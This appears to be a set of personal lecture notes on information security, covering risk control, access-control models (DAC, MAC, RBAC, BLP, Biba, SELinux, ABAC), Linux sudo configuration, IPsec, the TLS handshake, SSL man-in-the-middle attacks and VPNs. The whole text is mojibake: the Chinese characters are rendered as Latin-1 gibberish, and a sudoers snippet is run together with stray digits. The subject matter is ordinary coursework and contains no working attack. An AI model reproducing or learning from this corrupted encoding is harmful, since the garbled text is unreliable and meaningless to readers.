2.2 ä¿¡æ¯å®‰å…¨çš„ç›®æ ‡è¿™å¥æ˜¯é‡ç‚¹:é˜²æ­¢å¨èƒåˆ©ç”¨å¼±ç‚¹ç ´åä¿¡æ¯å®‰å…¨ç‰¹æ€§, ä»¥åŠ æ§åˆ¶é£é™©
æ§åˆ¶é£é™©ï¼Œç¡®å®šå¨èƒåˆ©ç”¨å¼±ç‚¹å®æ–½ ç ´åå‘ç”Ÿçš„æ¦‚ç‡ï¼ˆè¯†åˆ«é£é™©ï¼‰ï¼Œå†³å®šé‡‡å–ä½•ç§æªæ–½ï¼Œå°†é£é™©é™ä½åˆ°å¯ä»¥æ¥å—çš„æ°´å¹³ã€‚ä»ç»å¯¹å®‰å…¨åˆ°é€‚åº¦å®‰å…¨ï¼›é˜²æ­¢å¨èƒåˆ©ç”¨å¼±ç‚¹ç ´åä¿¡æ¯å®‰å…¨ç‰¹æ€§


ä¿¡æ¯å®‰å…¨é£é™©çš„æ¦‚å¿µï¼Ÿä»ç»å¯¹å®‰å…¨åˆ°é€‚åº¦å®‰å…¨ï¼›

å®Œæˆä¸€ä¸ªç»„ç»‡å¦‚ä½•è¯„ä¼°ã€åº”å¯¹ã€ç›‘è§†ä¿¡æ¯ç³»ç»Ÿå®‰å…¨é£é™©çš„ç­–ç•¥æ€§è§„å®šï¼ŒåŒ…æ‹¬

è¯¦ç»†çš„å®‰å…¨å‡å®šç¡®å®šï¼›
å®‰å…¨é£é™©æ§åˆ¶å®æ–½æ‰€å—çš„å„ç§å¯èƒ½çš„é™åˆ¶ï¼›
æœºæ„å¯¹é£é™©çš„å®¹å¿ç¨‹åº¦ï¼›
é£é™©å¤„ç†è¿‡ç¨‹ä¸­çš„é¢ä¸´çš„å„ç§è¿™ç§å†³ç­–çš„ä¼˜å…ˆæ¬¡åºï¼›

å¨èƒåˆ©ç”¨å¼±ç‚¹ç»™ä¿¡æ¯èµ„äº§é€ æˆè´Ÿé¢å½±å“çš„æ½œåœ¨å¯èƒ½
2.3 ä¿æŠ¤é˜¶æ®µçš„ç›®æ ‡ï¼šTCSECæ©˜çš®ä¹¦å’ŒCCæ ‡å‡†ï¼›2.4 ç”Ÿå‘½å‘¨æœŸé˜¶æ®µçš„ä¿æŠ¤ç›®æ ‡ï¼š

å…¥ä¾µæ£€æµ‹æŠ€æœ¯IDSæ˜¯PDRæ¨¡å‹çš„ä¸­çš„é‡è¦æ”¯æ’‘æŠ€æœ¯ï¼ŒIDSä¸»è¦çš„åŠŸèƒ½ä¸ºï¼šç›‘è§†ã€è¯„ä¼°ä¿¡æ¯ç½‘ç»œç³»ç»Ÿä¸­çš„æ¶æ„æˆ–è€…è¿åå®‰å…¨ç­–ç•¥çš„è¡Œä¸ºï¼Œå¹¶äº§ç”Ÿç›¸åº”çš„æŠ¥è­¦ã€‚


PDCA çš„æ¦‚å¿µï¼š


Planï¼š å¯¹ISMSèŒƒå›´æ‰€åŠè¿›è¡Œé£é™©è¯„ä¼°å’Œæ§åˆ¶æ–¹æ¡ˆè®¾è®¡ï¼›
Doï¼šå¯¹äºä¸å¯æ¥å—é£é™©ï¼Œå®æ–½é£é™©å¤„ç†è®¡åˆ’ï¼Œæ¯”å¦‚å¢åŠ é˜²ç«å¢™ç­‰å®‰å…¨æªæ–½ï¼›
Checkï¼šåˆ†æè¿è¡Œæ•ˆæœï¼Œå¯»æ±‚æ”¹è¿›æœºä¼šï¼›
Actï¼š ç»è¿‡äº†è¯„å®¡ä¹‹åï¼Œè¦æ‰§è¡Œçš„è¿›ä¸€æ­¥åŠ¨ä½œï¼›

2.5 å¯ç”Ÿå­˜æŠ€æœ¯ï¼šæ‹œå åº­å®¹é”™å’Œé—¨é™å¯†ç æŠ€æœ¯æŠ€æœ¯æ€è·¯: æ¶ˆé™¤å•ç‚¹å¤±æ•ˆ
å¯ç”Ÿå­˜æŠ€æœ¯çš„åŸºæœ¬åŸç†ï¼šä¿¡æ¯ç³»ç»Ÿé€šè¿‡ç‰¹å®šçš„è®¾è®¡ï¼Œå˜å¾—ä¸æ˜¯é‚£ä¹ˆè„†å¼±ï¼Œä¸€ç¢°å°±å€’ï¼Œä¸€è§¦å³æºƒã€‚ä¿¡æ¯ç³»ç»Ÿç”Ÿå­˜æŠ€æœ¯å…³æ³¨ï¼šè®¡ç®—è¿‡ç¨‹çš„å¯é æ€§å’Œé”™è¯¯å®¹å¿ã€‚




2.6 è‡ªé‡æ„å¯ä¿¡èµ–ä¿æŠ¤æŠ€æœ¯ï¼šåŠ¨æ€æ„å»ºã€é€‚åº¦å®‰å…¨ã€éšç€ä»»åŠ¡å¯åŠ¨ç”Ÿæˆä¿æŠ¤ï¼Œéšä»»åŠ¡ç»“æŸæ¨å‡ºï¼ˆä¿æŠ¤çš„ç”Ÿä¸æ­»ï¼‰
ç¬¬ä¸‰æ¬¡è¯¾ï¼šè‡ªä¸»ä¸å¼ºåˆ¶è®¿é—®æ§åˆ¶è‡ªå·±çš„ç†è§£: è®¾å®šæƒé™èŒƒå›´,åˆ’æ¸…ç•Œé™
ä¿æŠ¤çš„æ ¸å¿ƒæŠ€æœ¯
3.1 è®¿é—®æ§åˆ¶çš„åŸºæœ¬æ¦‚å¿µæ¡†æ¶æ¨¡å‹,ä¸æ˜¯ç­–ç•¥æ¨¡å‹
åº”ç”¨ç¨‹åºè®¿é—®è®¡ç®—æœºèµ„æºï¼Œæ ¹æ®æˆæƒç­–ç•¥ï¼ˆ è§„åˆ™é›†ï¼‰å†³å®šè®¿é—®è¯·æ±‚æ˜¯å¦è¢«å…è®¸ã€‚
3.2 è®¿é—®æ§åˆ¶çš„è¦ç´ ï¼Ÿ
ä¸»ä½“Sï¼ˆSubjectï¼‰ï¼šèµ„æºè®¿é—®çš„å…·ä½“è¯·æ±‚è€…ï¼Œåˆç§°å‘èµ·è€…ï¼ˆInitiatorï¼‰ï¼Œå¯èƒ½æ˜¯æŸä¸€ç”¨æˆ·ï¼Œä¿¡æ¯ç³»ç»Ÿä¸­æ›´å¤šæ˜¯ç”¨æˆ·å¯åŠ¨çš„è¿›ç¨‹ã€æœåŠ¡å’Œè®¾å¤‡ç­‰ã€‚
å®¢ä½“Oï¼ˆObjectï¼‰ï¼šæ˜¯æŒ‡è¢«è®¿é—®èµ„æºçš„å®ä½“ï¼Œåˆç§°ç›®æ ‡ï¼ˆTargetï¼‰ï¼Œæ‰€æœ‰å¯ä»¥è¢«æ“ä½œçš„ä¿¡æ¯ã€èµ„æºã€å¯¹è±¡éƒ½å¯ä»¥æ˜¯å®¢ä½“ã€‚
æ§åˆ¶ç­–ç•¥Aï¼ˆAttributionï¼‰ï¼šè®¿é—®ç­–ç•¥ä½“ç°äº†ä¸»ä½“å¯¹å®¢ä½“çš„æˆæƒè¡Œä¸ºï¼Œä¹Ÿæ˜¯å®¢ä½“å¯¹ä¸»ä½“æŸäº›æ“ä½œè¡Œä¸ºçš„è®¤å¯ã€‚

3.3 è®¿é—®æ§åˆ¶3ç§åŸºæœ¬ç±»å‹ï¼Ÿæ¨¡å‹å«ä¹‰æ˜¯é‡ç‚¹,
ä»€ä¹ˆmac dacææ¸…æ¥š
æ¨¡å‹ä¸æ˜¯æ¥é™åˆ¶ä½ çš„,è€Œæ˜¯æœ‰å®ƒé€‚ç”¨èŒƒå›´,ç»™ä½ ä¸€ä¸ªä¾æ®æ¥å…·ä½“è®¾ç½®è®¿é—®æ§åˆ¶æ¨¡å‹
è‡ªä¸»è®¿é—®æ§åˆ¶DAC(å…¸å‹æ¡ˆä¾‹:UGO) (Discretionary Access Control)å¼ºåˆ¶è®¿é—®æ§åˆ¶MACï¼ˆMandatory Access Control)åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶RBACå®ƒå’ŒåŸºäºç»„çš„è®¿é—®æ§åˆ¶ä¸ä¸€æ ·


3.4 è®¿é—®æ§åˆ¶çŸ©é˜µã€è®¿é—®æ§åˆ¶åˆ—è¡¨ã€è®¿é—®æ§åˆ¶èƒ½åŠ›å’Œå®‰å…¨æ ‡ç­¾çš„æ¦‚å¿µï¼ŸçŸ©é˜µ,åˆ—è¡¨ éƒ½å±äºdac,éƒ½æ˜¯è‡ªä¸»è®¿é—®æ§åˆ¶,å’Œç”¨æˆ·å¯†åˆ‡ç›¸å…³
ibacåˆ—è¡¨å’Œèƒ½åŠ›cbacå¾ˆé‡è¦

è®¿é—®æ§åˆ¶çŸ©é˜µä¸­ä¸€è¡Œä»£è¡¨ä¸€ä¸ªä¸»ä½“ï¼Œä¸€åˆ—ä»£è¡¨ä¸€ä¸ªå®¢ä½“ï¼Œä¸€ä¸ªå…ƒç´ è¡¨ç¤ºä¸€ä¸ªä¸»ä½“è¢«æˆæƒçš„å¯¹å®¢ä½“çš„æ“ä½œï¼›è®¿é—®æ§åˆ¶çŸ©é˜µå¯ä»¥ç›´è§‚åœ°è¡¨ç¤ºä¸»ä½“ä¸å®¢ä½“çš„å…³ç³»ï¼Œå¯¹äºæ¨å¯¼å’Œæè¿°è®¿é—®æ§åˆ¶ç­–ç•¥å…·æœ‰æ„ä¹‰ã€‚

è®¿é—®æ§åˆ¶åˆ—è¡¨(ibac,identify based access controlåŸºäºèº«ä»½çš„)æ˜¯ç›®æ ‡å¯¹è±¡çš„å±æ€§è¡¨ï¼Œå®ƒç»™å®šæ¯ä¸ªç”¨æˆ·å¯¹ç»™å®šç›®æ ‡çš„è®¿é—®æƒé™ï¼Œæœ¬è´¨ä¸Šæ˜¯è®¿é—®æ§åˆ¶çŸ©é˜µçš„ä¸€ä¸ªåˆ—ã€‚


è®¿é—®æ§åˆ¶èƒ½åŠ›(cbac åŸºäºèƒ½åŠ›çš„)æ˜¯å‘èµ·è€…æ‹¥æœ‰çš„ä¸€ä¸ªæœ‰æ•ˆæ ‡ç­¾ï¼ˆTicketï¼‰ï¼Œå®ƒæˆæƒæŒæœ‰è€…ä»¥ç‰¹å®šçš„æ–¹å¼è®¿é—®ç‰¹å®šçš„ç›®æ ‡ã€‚


å®‰å…¨æ ‡ç­¾é€šå¸¸çš„ç”¨é€”æ˜¯æ”¯æŒå¤šçº§è®¿é—®æ§åˆ¶ç­–ç•¥åœ¨è®¿é—®æ§åˆ¶ä¸­ï¼Œ ä¸€ä¸ªå®‰å…¨æ ‡ç­¾éš¶å±äºä¸€ä¸ªç”¨æˆ·ã€ä¸€ä¸ªç›®æ ‡ã€ä¸€ä¸ªè®¿é—®è¯·æ±‚æˆ–ä¼ è¾“ä¸­çš„ä¸€ä¸ªè®¿é—®æ§åˆ¶ä¿¡æ¯ã€‚æ ‡ç­¾çš„äº§ç”Ÿå’Œé™„ç€ä¸ªè¿‡ç¨‹å¿…é¡»å¯ä¿¡ï¼Œåœ¨å¤„ç†ä¸€ä¸ªè®¿é—®è¯·æ±‚æ—¶ï¼Œç›®æ ‡ç¯å¢ƒæ¯”è¾ƒè¯·æ±‚ä¸Šçš„æ ‡ç­¾å’Œç›®æ ‡ä¸Šçš„æ ‡ç­¾å†³å®šæ˜¯å…è®¸è¿˜æ˜¯æ‹’ç»è®¿é—®ã€‚


3.5 è‡ªä¸»è®¿é—®æ§åˆ¶å’Œå¼ºåˆ¶è®¿é—®æ§åˆ¶ï¼›ç†è§£æ ¸å¿ƒ.è§’è‰²æ˜¯ä»€ä¹ˆä»€ä¹ˆçš„
è‡ªä¸»è®¿é—®æ§åˆ¶ï¼šDACå…è®¸åˆæ³•ç”¨æˆ·ä»¥ç”¨æˆ·æˆ–ç”¨æˆ·ç»„çš„èº«ä»½è®¿é—®ç­–ç•¥è§„å®šçš„å®¢ä½“ï¼ŒåŒæ—¶é˜»æ­¢éæˆæƒç”¨æˆ·è®¿é—®å®¢ä½“ã€‚
å¼ºåˆ¶è®¿é—®æ§åˆ¶ï¼šMACå®ç°æ¯”DACæ›´ä¸ºä¸¥æ ¼çš„è®¿é—®æ§åˆ¶ç­–ç•¥ï¼Œ MACæ˜¯ä¸€ç§å¤šçº§è®¿é—®æ§åˆ¶ç­–ç•¥ï¼Œç”¨æˆ·å’Œå®¢ä½“å…·æœ‰ä¸åŒçš„å®‰å…¨çº§åˆ«ï¼Œç”¨æˆ·ä¸èƒ½æ”¹å˜è‡ªèº«å’Œå®¢ä½“çš„å®‰å…¨çº§åˆ«ï¼Œåªæœ‰ç®¡ç†å‘˜æ‰èƒ½å¤Ÿç¡®å®šç”¨æˆ·å’Œç»„çš„è®¿é—®æƒé™ï¼Œç³»ç»Ÿå¯¹è®¿é—®ä¸»ä½“å’Œå—æ§å¯¹è±¡ï¼Œ æŒ‰ç…§å®‰å…¨çº§å¯¹åº”è§„åˆ™å®è¡Œå¼ºåˆ¶è®¿é—®æ§åˆ¶ã€‚
3.6 BLPã€BIBAæ¨¡å‹(å¤šçº§å®‰å…¨å¼ºåˆ¶è®¿é—®æ§åˆ¶ç­–ç•¥)Bellï¼Lapadulaï¼ˆBLPï¼‰æ¨¡å‹  å…³æ³¨æœºå¯†æ€§å®¢ä½“è¢«åˆ†æˆå®‰å…¨çº§åˆ«ä¾æ¬¡é™ä½çš„:ç»å¯†ã€æœºå¯†ã€ç§˜å¯†å’Œå…¬å¼€ç­‰çº§åˆ«
ä¸»ä½“ä¹Ÿè¢«åˆ¶å®šä¸åŒçš„å®‰å…¨çº§åˆ«
BLPæ¨¡å‹ç¡®ä¿: æœºå¯†ä¿¡æ¯ä¸ä¼šä»é«˜å®‰å…¨çº§åˆ«æµå‘ä½å®‰å…¨çº§åˆ«
BLPæ¨¡å‹ç”±æ”¿åºœèµ„åŠ©çš„Mitre å…¬å¸æ­£å¼æå‡ºï¼ŒBLPæ¨¡å‹å…³æ³¨å¤šçº§å®‰å…¨ä¸­çš„æœºå¯†æ€§ä¿æŠ¤ï¼Œå®¢ä½“è¢«åˆ†æˆå®‰å…¨çº§åˆ«ä¾æ¬¡é™ä½çš„ï¼šç»å¯†ã€æœºå¯†ã€ç§˜å¯†å’Œå…¬å¼€ç­‰çº§åˆ«ï¼Œä¸»ä½“ä¹Ÿè¢«åˆ¶å®šä¸åŒçš„å®‰å…¨çº§åˆ«ï¼ŒBLPæ¨¡å‹ç¡®ä¿æœºå¯†ä¿¡æ¯ä¸ä¼šä»é«˜å®‰å…¨çº§åˆ«æµå‘ä½å®‰å…¨çº§åˆ«ã€‚BLPæ¨¡å‹ä¸­ä¸€ä¸ªç³»ç»Ÿçš„çŠ¶æ€å¯ä»¥ç”¨ä¸‰å…ƒç»„{b,M,f}æ ‡ç¤ºï¼› å¦‚æœä¸»ä½“è®¿é—®å®¢ä½“çš„æ“ä½œä¸ç³»ç»Ÿç¡®å®šçš„å®‰å…¨è§„åˆ™ä¸€è‡´ï¼Œåˆ™ç³»ç»Ÿçš„çŠ¶æ€æ˜¯å®‰å…¨çš„ã€‚ BLPæ¨¡å‹å®šä¹‰äº†ç³»ç»Ÿçš„å®‰å…¨è§„åˆ™ã€‚
BIBAæ¨¡å‹ å…³æ³¨å®Œæ•´æ€§BLPå®‰å…¨æ¨¡å‹ä»…å…³æ³¨ä¿¡æ¯çš„æœºå¯†æ€§ï¼ŒBibaå®‰å…¨æ¨¡å‹å…³æ³¨å¤šçº§å®‰å…¨ç³»ç»Ÿä¸­çš„ä¿¡æ¯å®Œæ•´æ€§ä¿æŠ¤ã€‚Bibaæ¨¡å‹ç”±ä¸€ç»„å¼ºåˆ¶è®¿é—®æ§åˆ¶ç­–ç•¥å’Œä¸€ç»„è‡ªä¸»è®¿é—®æ§åˆ¶ç­–ç•¥ç»„æˆã€‚åœ¨æ“ä½œç³»ç»Ÿé‡Œï¼Œä¸ºç¡®ä¿å†…æ ¸å®Œæ•´æ€§ï¼Œä»Bibaæ¨¡å‹çš„è§’åº¦ï¼Œå†…æ ¸å¯ä»¥è°ƒç”¨åº”ç”¨ç¨‹åºï¼Œåä¹‹å°†æ˜¯è¿åBibaæ¨¡å‹å®‰å…¨è§„åˆ™çš„æ“ä½œã€‚
3.7 Linuxçš„UGOè®¿é—®æ§åˆ¶åŸç† æœ¬è´¨ä¸Šå±äº åŸºäºè®¿é—®æ§åˆ¶åˆ—è¡¨çš„æœºåˆ¶
åœ¨æ¯ä¸ªæ–‡ä»¶ä¸Šé™„åŠ ä¸€æ®µæœ‰å…³è®¿é—®æ§åˆ¶ä¿¡æ¯çš„äºŒè¿›åˆ¶ä½ï¼Œè¿™äº›äºŒè¿›åˆ¶ä½åæ˜ äº†ä¸åŒç±»åˆ«ç”¨æˆ·å¯¹è¯¥æ–‡ä»¶çš„å­˜å–æ–¹å¼ï¼Œå³æ–‡ä»¶çš„æ‹¥æœ‰è€…ï¼ˆUserï¼Œ Ownerï¼‰ã€æ–‡ä»¶æ‹¥æœ‰è€…åŒç»„çš„ç”¨æˆ·ï¼ˆGroupï¼‰å’Œå…¶ä»–ç”¨æˆ·ï¼ˆOtherï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬ç§°è¿™ä¸ªæ–¹å¼ä¸ºUGOè‡ªä¸»è®¿é—®æ§åˆ¶ã€‚UGOå±äºåŸºäºè®¿é—®æ§åˆ¶åˆ—è¡¨çš„æœºåˆ¶ï¼ŒåŸºäºè®¿é—®æ§åˆ¶åˆ—è¡¨çš„æœºåˆ¶éœ€è¦ä¾èµ–äºå¯¹ç”¨æˆ·çš„é‰´åˆ«ã€‚
sudosudoå²‚ä¸æ˜¯ä¸‡èƒ½çš„?å’Œrootä¸€æ ·å—?
ä¸æ˜¯çš„,å¯ä»¥é™åˆ¶ä½¿ç”¨çš„
123#includedir /etc/sudoers.dlighthouse ALL=(ALL) NOPASSWD: ALLubuntu  ALL=(ALL:ALL) NOPASSWD: ALL





ç¬¬å››æ¬¡è¯¾ï¼šåŸºäºå±æ€§çš„è®¿é—®æ§åˆ¶ABAC4.1 SELinuxï¼šåŸºäºç±»å‹çš„è®¿é—®æ§åˆ¶ï¼Œå®‰å…¨ä¸Šä¸‹æ–‡ï¼›SELinuxåŸºæœ¬æ¦‚å¿µé€šè¿‡ç±»å‹å¼ºåˆ¶ï¼ˆTEï¼‰è®¿é—®æ§åˆ¶æä¾›äº†æ›´ä¸ºçµæ´»ã€å®ç”¨MACæœºåˆ¶ã€‚åœ¨SELInuxä¸­ï¼Œæ‰€æœ‰è®¿é—®å¿…é¡»æ˜ç¡®æˆæƒï¼Œé€šè¿‡ä½¿ç”¨allowè§„åˆ™æˆäºˆè®¿é—®æƒé™ã€‚Allowè§„åˆ™æœ‰å››éƒ¨åˆ†ç»„æˆï¼š


æºç±»å‹ï¼šå°è¯•è¿›è¡Œè®¿é—®æ§åˆ¶çš„åŸŸç±»å‹ã€‚
ç›®æ ‡ç±»å‹ï¼šè¢«è¿›ç¨‹è®¿é—®çš„å®¢ä½“ç±»å‹ã€‚
å®¢ä½“ç±»åˆ«ï¼šå…è®¸è®¿é—®çš„å®¢ä½“çš„ç§ç±»åç§°ã€‚
è®¸å¯ï¼šç›®æ ‡ç±»å‹å…è®¸æºç±»å‹è®¿é—®çš„ç§ç±»ã€‚



å®‰å…¨ä¸Šä¸‹æ–‡æ‰€æœ‰æ“ä½œç³»ç»Ÿè®¿é—®æ§åˆ¶éƒ½æ˜¯ä»¥å…³è”çš„å®¢ä½“å’Œä¸»ä½“çš„è®¿é—®æ§åˆ¶å±æ€§ä¸ºåŸºç¡€ï¼›è®¿é—®æ§åˆ¶å±æ€§å«åšå®‰å…¨ä¸Šä¸‹æ–‡ã€‚ä¸€ä¸ªå®‰å…¨ä¸Šä¸‹æ–‡çš„ç»„æˆæ ¼å¼å¦‚ä¸‹ï¼š{ç”¨æˆ·ï¼›è§’è‰²ï¼›ç±»å‹}ã€‚


4.2 åŸºäºå±æ€§çš„è®¿é—®æ§åˆ¶ï¼ˆABACï¼‰ï¼šåŸºæœ¬æ¦‚å¿µï¼Œä¸»è¦å…ƒç´ ï¼ŒåŸºæœ¬æ¶æ„ï¼Œä¼ ç»Ÿè®¿é—®æ§åˆ¶æ¨¡å‹ä¸ABACçš„è”ç³»ï¼›åŸºäºå±æ€§çš„ç­–ç•¥ã€‚ABACåŸºæœ¬æ¦‚å¿µABACå®šä¹‰äº†ä¸»é¢˜çš„å±æ€§å’Œå®¢ä½“çš„å±æ€§ä»¥åŠè®¿é—®å‘ç”Ÿæ—¶å€™çš„æ¡ä»¶ï¼ŒABACå°†è¿™äº›å±æ€§ä¿¡æ¯å’Œæ¡ä»¶ä¿¡æ¯ä¸è§„åˆ™çš„ä¿¡æ¯å¯¹æ¯”è¿›è¡Œè®¿é—®æ§åˆ¶å†³ç­–ã€‚ABACçš„æ§åˆ¶è§„åˆ™ç”±å±æ€§å’Œæ¡ä»¶ä¿¡æ¯ç»„æˆã€‚ABACä¸­æ¯ä¸€ä¸ªå®¢ä½“éƒ½å¿…é¡»è‡³å°‘æœ‰ä¸€ä¸ªç­–ç•¥è§„åˆ™å†³å®šä»€ä¹ˆæ ·çš„ä¸»ä½“èƒ½å¤Ÿå¯¹å…¶è¿›è¡Œä»€ä¹ˆæ ·çš„æ“ä½œã€‚
å…ƒç´ 

å±æ€§ï¼šåˆ»ç”»ä¸»ä½“ã€å®¢ä½“å’Œæ¡ä»¶ç‰¹æ€§çš„â€œé”®å€¼å¯¹â€ã€‚
ä¸»ä½“ï¼šæ„å›¾æ‰§è¡Œè®¿é—®æ“ä½œçš„è‡ªç„¶äººæˆ–éäººè®¾å¤‡ã€‚
å®¢ä½“ï¼šABACä¿æŠ¤ä¸‹çš„ç³»ç»Ÿèµ„æºä¾‹å¦‚ï¼š è®¾å¤‡ã€æ–‡ä»¶ã€è¿›ç¨‹ã€ç½‘ç»œæœåŠ¡ç­‰ã€‚
æ“ä½œï¼šä¸»ä½“å¯¹å®¢ä½“çš„æ“ä½œï¼ŒåŒ…æ‹¬ï¼š è¯»ã€å†™ã€ç¼–è¾‘ã€åˆ é™¤ã€æ‹·è´ã€æ‰§è¡Œç­‰ã€‚
æ”¿ç­–ï¼šä¸€ç»„è§„åˆ™æˆ–è€…å…³ç³»ï¼Œç”¨äºç¡®å®šä¸€ä¸ªè®¿é—®è¯·æ±‚æ˜¯å¦è¢«å…è®¸æˆ–è€…æ‹’ç»ã€‚
ç¯å¢ƒä¸Šä¸‹æ–‡ï¼šå¯ä»¥æ£€æµ‹åˆ°çš„ç¯å¢ƒä¸Šä¸‹æ–‡ç‰¹å¾ï¼Œå¦‚ï¼šè®¿é—®å‘ç”Ÿæ—¶çš„æ—¶é—´ã€åœ°ç‚¹å’Œå¨èƒæ°´å¹³ç­‰ã€‚



æ¶æ„&#x2F;è¿‡ç¨‹

Access Control Mechanismï¼ˆACMï¼‰æ”¶åˆ°ä¸»ä½“çš„è®¿é—®æ§åˆ¶è¯·æ±‚ï¼›
æ ¹æ®Policyæ£€æŸ¥ä¸»ä½“å±æ€§ã€å®¢ä½“å±æ€§ä»¥åŠç¯å¢ƒæ¡ä»¶ï¼›
å†³å®šä¸»ä½“å¯¹å®¢ä½“çš„æ“ä½œæ˜¯å¦å…è®¸ã€‚



ä¼ ç»Ÿè®¿é—®æ§åˆ¶ä¸ABACè”ç³»åŸºäºèº«ä»½çš„è®¿é—®æ§åˆ¶å’ŒRBACå¯ä»¥çœ‹ä½œæ˜¯ ABACçš„ä¸€ä¸ªç‰¹ä¾‹ï¼Œè§’è‰²ä¹Ÿå¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªå±æ€§ï¼Œä»è€Œå°†è§’è‰²çš„è®¿é—®æ§åˆ¶ç­–ç•¥è½¬æ¢æˆå±æ€§è§„åˆ™ã€‚
åŸºäºå±æ€§çš„ç­–ç•¥ABACå±æ€§ç®¡ç†ä¸»è¦å®Œæˆå±æ€§çš„å‘½åã€å®šä¹‰ã€å–å€¼èŒƒå›´ç¡®å®šä»¥åŠä¸ä¸»ä½“å’Œå®¢ä½“ç»‘å®šç­‰ã€‚ä¸»ä½“å±æ€§ä¸€èˆ¬ç”±å±æ€§ç®¡ç†æœºæ„æä¾›ï¼Œå¦‚æœä¸åŒæœºæ„çš„ä¸»ä½“å­˜åœ¨è®¿é—®éœ€æ±‚ï¼Œéœ€è¦åœ¨ä¸åŒæœºæ„ä¹‹é—´å»ºç«‹å±æ€§æ˜ å°„æœºåˆ¶ã€‚
ç¬¬äº”æ¬¡è¯¾ï¼šç½‘ç»œè¾¹ç•Œä¸é˜²æŠ¤ipsecå¯ä»¥æ”¯æŒipå±‚æ‰€æœ‰æµé‡çš„åŠ å¯†å’Œ&#x2F;æˆ–é‰´åˆ«,å› æ­¤å¯ä»¥å¢å¼ºæ‰€æœ‰åˆ†å¸ƒå¼åº”ç”¨çš„å®‰å…¨æ€§
5.1 IPSECåè®®çš„ä¸¤ä¸ªåŸºæœ¬åè®®ï¼š
é‰´åˆ«å¤´åè®® AH ï¼šAHåè®®æä¾›æ•°æ®æºè®¤è¯ã€æ•°æ®å®Œæ•´æ€§æ ¡éªŒå’ŒæŠ¥æ–‡é˜²é‡æ”¾åŠŸèƒ½ï¼Œ ä½†ä¸æä¾›æœºå¯†æ€§ã€‚
æ•°æ®æºèº«ä»½éªŒè¯ï¼šè®¡ç®—éªŒè¯ç æ—¶åŠ å…¥ä¸€ä¸ªå…±äº«å¯†é’¥ï¼ˆHMACï¼‰ 
å®Œæ•´æ€§éªŒè¯ï¼šé€šè¿‡æ‚å‡‘å‡½æ•°äº§ç”Ÿçš„æ ¡éªŒå€¼ 
AHæŠ¥å¤´ä¸­çš„åºåˆ—å·é˜²æ­¢é‡æ”¾æ”»å‡»


æœ‰æ•ˆè½½è·å°è£…åè®®ESPï¼šæä¾›äº†é™¤äº†AHè®¤è¯å¤´åè®®çš„æ‰€æœ‰åŠŸèƒ½å¤–ï¼Œè¿˜å¯ä»¥å¯¹IPæŠ¥æ–‡å‡€è·è¿›è¡ŒåŠ å¯†ã€‚



IPSecé€šè¿‡AHå’ŒESPè¿™ä¸¤ä¸ªå®‰å…¨åè®®æ¥å®ç°IPæ•°æ®æŠ¥çš„å®‰å…¨ä¼ è¾“ã€‚AHå’ŒESPå¯ä»¥å•ç‹¬ä½¿ç”¨ï¼Œä¹Ÿå¯åŒæ—¶ä½¿ç”¨ã€‚AHå’ŒESPåŒæ—¶ä½¿ç”¨æ—¶ï¼ŒæŠ¥æ–‡åœ¨IPSecå®‰å…¨è½¬æ¢æ—¶ï¼Œå…ˆè¿›è¡ŒESPå°è£…ï¼Œå†è¿›è¡ŒAHå°è£…ï¼›IPSecè§£å°è£…æ—¶ï¼Œå…ˆè¿›è¡ŒAHè§£å°è£…ï¼Œå†è¿›è¡ŒESPè§£å°è£…ã€‚


5.2 IPSEC çš„ä¸¤ä¸ªå·¥ä½œæ¨¡å¼ï¼š

ä¼ è¾“æ¨¡å¼ï¼šåœ¨ä¼ è¾“æ¨¡å¼ä¸‹ï¼ŒAHæˆ–ESPè¢«æ’å…¥åˆ°IPå¤´ä¹‹åä½†åœ¨ä¼ è¾“å±‚åè®®ä¹‹å‰ã€‚



éš§é“æ¨¡å¼ï¼šåœ¨éš§é“æ¨¡å¼ä¸‹ï¼ŒAHæˆ–ESPåœ¨åŸå§‹IPå¤´å‰ï¼Œå¦å¤–ç”Ÿæˆä¸€ä¸ªæ–°çš„IP å¤´æ”¾åˆ°AHæˆ–ESPä¹‹å‰ã€‚


5.3 TLSåè®®æ¡æ‰‹è¿‡ç¨‹ã€ä¸­é—´äººæ”»å‡»ï¼›å››ä¸ªé˜¶æ®µ,æ¡æ‰‹æ˜¯å¹²ä»€ä¹ˆçš„,æ€ä¹ˆå®Œæˆèº«ä»½é‰´åˆ«,å¯†é’¥åå•†,å®‰å…¨çš„é€šé“
æ¡æ‰‹è¿‡ç¨‹http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html


ä¸­é—´äººæ”»å‡»
èƒ½å¤Ÿé€šè¿‡ARP æ¬ºéª—ã€DNS æ¬ºéª—æˆ–è€…æµè§ˆå™¨æ•°æ®é‡å®šå‘ç­‰æ¬ºéª—æŠ€æœ¯ï¼Œ ä½¿å¾—SSLå®¢æˆ·ç«¯Cå’ŒæœåŠ¡å™¨ç«¯Sçš„æ•°æ®éƒ½æµå‘SSL MITMæ”»å‡»æœºMã€‚
SSLå®¢æˆ·ç«¯ç”¨æˆ·åœ¨æ¥æ”¶åˆ°SSL MITMæ”»å‡»æœºä¼ªé€ çš„æ•°å­—è¯ä¹¦åï¼Œ è¢«éª—å–å¯¹è¯¥è¯ä¹¦çš„ä¿¡ä»»ï¼Œ å¹¶ç»§ç»­SSLè¿æ¥ã€‚
SSLæœåŠ¡å™¨æœªè¦æ±‚è¿›è¡ŒSSLå®¢æˆ·ç«¯èº«ä»½é‰´åˆ«ã€‚
5.4 VPNåŸºæœ¬åŸç†VPNè™šæ‹Ÿä¸“ç”¨ç½‘ç»œï¼Œæ˜¯ä¾é ISPå’Œå…¶ä»–çš„NSPï¼Œåœ¨å…¬å…±ç½‘ç»œä¸­å»ºç«‹ä¸“ç”¨çš„æ•°æ®é€šä¿¡çš„ç½‘ç»œæŠ€æœ¯ï¼Œå¯ä»¥ä¸ºä¼ä¸šä¹‹é—´æˆ–è€…ä¸ªäººä¸ä¼ä¸šä¹‹é—´æä¾›å®‰å…¨çš„æ•°æ®ä¼ è¾“éš§é“æœåŠ¡ã€‚
